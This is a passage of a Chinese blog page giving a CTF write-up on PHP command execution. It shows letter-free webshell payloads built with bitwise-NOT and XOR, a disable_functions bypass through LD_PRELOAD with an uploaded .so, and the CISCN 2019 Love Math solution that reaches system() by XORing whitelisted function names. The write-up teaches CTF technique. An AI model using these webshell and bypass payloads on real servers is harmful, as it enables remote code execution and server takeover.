+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br></div></td><td><div class="text codecolorer">(~%9A%89%9E%93)((~%BE%8D%8D%9E%86)[(~%9E)]);<br>
+#eval($_POST['a']);<br>
+(~%9E%8C%8C%9A%8D%8B)((~%DB%A0%AF%B0%AC%AB)[(~%9E)]);<br>
+#assert($_POST['a']);</div></td></tr></tbody></table></div>
+<p>但是没有回显<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200413103428233.png" alt="在这里插入图片描述" class="box-hide"></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br></div></td><td><div class="text codecolorer">#既然上面的不行，可以将eval\assert函数结合使用一下<br>
+&lt;?php<br>
+$a='assert';<br>
+$b=urlencode(~$a);<br>
+echo $b;<br>
+echo "&lt;br&gt;";<br>
+$c='(eval($_POST[a]))';<br>
+$d=urlencode(~$c);<br>
+echo $d;<br>
+#payload：<br>
+(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200413105346708.png" alt="在这里插入图片描述" class="box-hide"><br>
+连接成功，接下来就上蚁剑<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200413110026548.png" alt="在这里插入图片描述" class="box-hide"><br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200413110359604.png" alt="在这里插入图片描述" class="box-hide"><br>
+但是没有权限读，一般根目录有一个/readflag都是让通过执行命令来拿flag，/readflag会有一个s权限 Linux 文件权限与ACL，所以这里需要绕过这个disable_functions来执行命令。</p>
+<p>看了师傅们的博客，可以通过比较好用的环境变量 <wyn>LD_preload + mail</wyn>劫持so来执行系统命令<br>
+https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD<br>
+https://www.freebuf.com/articles/web/192052.html<br>
+具体介绍可以自行查看，这个知识也很重要，之后再记录一下</p>
+<p>重新再构造一下payload，可以使用常用的<strong>异或payload</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br></div></td><td><div class="text codecolorer">$_="`{{{"^"?&lt;&gt;/";${$_}[_](${$_}[__]);&amp;_=assert&amp;__=<br>
+或<br>
+${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/20200413173203127.png" alt="在这里插入图片描述" class="box-hide"><br>
+再按照EXP，将文件上传到/var/tmp，在语句中包含一下上传的php文件</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br></div></td><td><div class="text codecolorer">?code=$_="`{{{"^"?&lt;&gt;/";${$_}[_](${$_}[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</div></td></tr></tbody></table></div>
+<p>即可得到flag<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200413173224111.png" alt="在这里插入图片描述" class="box-hide"></p>
+<p>从这道题真的能学到特别多的东西，尤其是无字符数字怎么样去构造出想要的字符串</p>
+<h4>[CISCN 2019 初赛]Love Math</h4>
+<p><strong>——利用题目白名单进行异或</strong><br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200414110753412.png" alt="在这里插入图片描述" class="box-hide"><br>
+这道题和上面的就不同了。过滤了一些符号，关键是最后要从输入的内容种提取跟白名单进行对比，如果不是白名单的函数再会报错，所以这道题不能再去网上找通用绕过payload了，就算找了也没用。</p>
+<p>唯一的思路就是利用白名单里面的函数进行异或（^没有被过滤），得到我们想要获取的字符串<br>
+<img src="./CTF下的命令执行 _ 码农家园_files/20200414112250289.png" alt="在这里插入图片描述" class="box-hide"><br>
+白名单中有dechex、decoct等，这些没被过滤，可以写一个脚本让白名单里面的函数和转换后的数字进行异或，得到结果</p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br></div></td><td><div class="text codecolorer">&lt;?php<br>
+$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; <br>
+foreach ($whitelist as $white){<br>
+&nbsp; &nbsp; for($a=1;$a&lt;999999;$a++) {<br>
+&nbsp; &nbsp; &nbsp; &nbsp; $result = $white^dechex($a);#使用decoct也可以<br>
+&nbsp; &nbsp; &nbsp; &nbsp; if(strpos($result,'_POST') === 0){<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $white." ".$a;<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $result;<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo "\n";<br>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br>
+&nbsp; &nbsp; }<br>
+}<br>
+# hexdec 481137_POST</div></td></tr></tbody></table></div>
+<p><img src="./CTF下的命令执行 _ 码农家园_files/2020041411295782.png" alt="在这里插入图片描述" class="box-hide"><br>
+构造出来的_POST,[]被过滤了，可以使用{}来代替。</p>
+<p><strong>payload：</strong></p>
+<div class="codecolorer-container text dawn" style="overflow:auto;white-space:nowrap;width:100%;"><table cellspacing="0" cellpadding="0"><tbody><tr><td class="line-numbers"><div>1<br>2<br>3<br>4<br></div></td><td><div class="text codecolorer">?c=$log=${hexdec^dechex(481137)};$log{cos}($log{abs});<br>
+#这里找的变量名必须是白名单里面的，最好选取短一些的函数，因为有长度限制的<br>
+POST DATA:<br>
+cos=system&amp;abs=ls</div></td></tr></tbody></table></div>
+<p>接下来查看flag就可以了</p>
+<p>除此之外，还有限制长度的，如七字、五字绕过等等，这次就先总结到这里，下次再单独总结一篇关于长度被限制的。</p>
+<h2>参考博客</h2>
+<p></p><center> <script src="./CTF下的命令执行 _ 码农家园_files/c5.js.下载"></script></center><p></p>
+<p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html<br>
+http://www.pdsdt.lovepdsdt.com/index.php/2019/10/17/php7-%e5%87%bd%e6%95%b0%e7%89%b9%e6%80%a7%e5%88%86%e6%9e%90/<br>
+https://www.e-learn.cn/content/php/1385759</p>
+																								
+						</div>
+						<script src="./CTF下的命令执行 _ 码农家园_files/ce.js.下载"></script><script async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+<!-- auto -->
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1776224780566592" data-ad-slot="9509745083" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<script data-ad-client="ca-pub-1776224780566592" async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+
+						<div class="clear"></div>
+						
+						<div class="social-main">
+					<div class="clear"></div>
+</div>												<div class="clear"></div>
+					</div><!-- .entry-content -->
+				</article><!-- #post -->
+														
+					<div class="ad-pc ad-site">
+			</div>					
+				
+												
+					</main><!-- .site-main -->
+	</div><!-- .content-area -->
+	<div id="sidebar" class="widget-area">			
+	<div class="sidebar-roll"></div>
+						<aside id="text-3" class="widget widget_text">			<div class="textwidget"><p><script src="./CTF下的命令执行 _ 码农家园_files/ce.js.下载"></script><script async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+<!-- auto -->
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1776224780566592" data-ad-slot="9509745083" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<script data-ad-client="ca-pub-1776224780566592" async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+</p>
+</div>
+		<div class="clear"></div></aside>				<div class="sidebar-roll">
+				<aside id="text-2" class="widget widget_text">			<div class="textwidget"><p><script src="./CTF下的命令执行 _ 码农家园_files/auto.js.下载"></script><script async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+<!-- auto -->
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-1776224780566592" data-ad-slot="9509745083" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<script data-ad-client="ca-pub-1776224780566592" async="" src="./CTF下的命令执行 _ 码农家园_files/f(1).txt"></script>
+</p>
+</div>
+		<div class="clear"></div></aside>				</div>
+			</div>
+</div>	<div class="clear"></div>
+</div><!-- .site-content -->
+<div id="footer" alog-group="log-footer">
+<div class="foot">
+	
+<div class="ps">
+<div class="p p2">
+
+<div class="clear"></div>
+<div class="site-info">			
+			Copyright ©&nbsp; 码农家园 联系：ddyu2x@gmail.com
+		</div>
+</div>
+
+
+</div>
+</div>
+</div>
+
+<div class="tools">
+    <a class="tools_top" title="返回顶部"></a>
+            
+    </div>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/superfish.js.下载"></script>
+<script type="text/javascript" src="./CTF下的命令执行 _ 码农家园_files/wp-embed.min.js.下载"></script>
+<script>(function(){var js = "window['__CF$cv$params']={r:'7dbde76ffb523fc9',m:'HSSCaTTjRdINQD2tMLdLEpuxejq.IYsjY298txVnMJY-1687535608-0-AXBybwoJY5zVRq/4nxeN1C9/CsrMXQCO69AEWuiL2USG'};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./CTF下的命令执行 _ 码农家园_files/saved_resource.html"></iframe>
+
+
+
+<div id="sidr-main" class="sidr left"><div class="sidr-inner"><a href="https://www.codenong.com/#sidr-close" class="sidr-class-toggle-sidr-close">关闭</a>
+			</div><div class="sidr-inner">
+				<a href="https://www.codenong.com/cs105422347/#sidr-main" id="sidr-id-navigation-toggle" class="sidr-class-bars">导航</a>	
+								
+					
+								
+			</div></div></body></html>
